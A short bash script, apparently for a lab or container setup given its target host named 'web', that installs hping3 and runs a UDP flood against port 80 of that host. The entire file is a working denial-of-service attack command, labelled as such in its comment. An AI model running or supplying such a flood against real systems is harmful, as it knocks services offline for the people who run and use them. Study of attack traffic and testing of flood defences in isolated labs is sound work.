#!/bin/bash

# Update package list and install hping3
apt-get update && apt-get install -y hping3

# Target IP and port
TARGET_IP="web"
TARGET_PORT=80

# Perform UDP flood attack
hping3 --udp -p $TARGET_PORT --flood $TARGET_IP 